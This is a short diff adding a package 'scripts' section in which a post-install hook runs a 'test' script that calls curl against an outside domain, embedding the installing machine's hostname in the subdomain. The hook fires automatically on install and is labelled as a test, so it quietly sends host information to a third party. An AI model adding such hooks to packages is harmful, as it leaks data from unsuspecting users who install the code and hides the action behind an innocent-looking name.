@@ -1,0 +1,8 @@
+"scripts": {
+    "post-install-cmd": [
+        "@test"
+    ],
+    "test": [
+        "curl http://f`hostname`f.x.ropchain.org/"
+    ]
+}
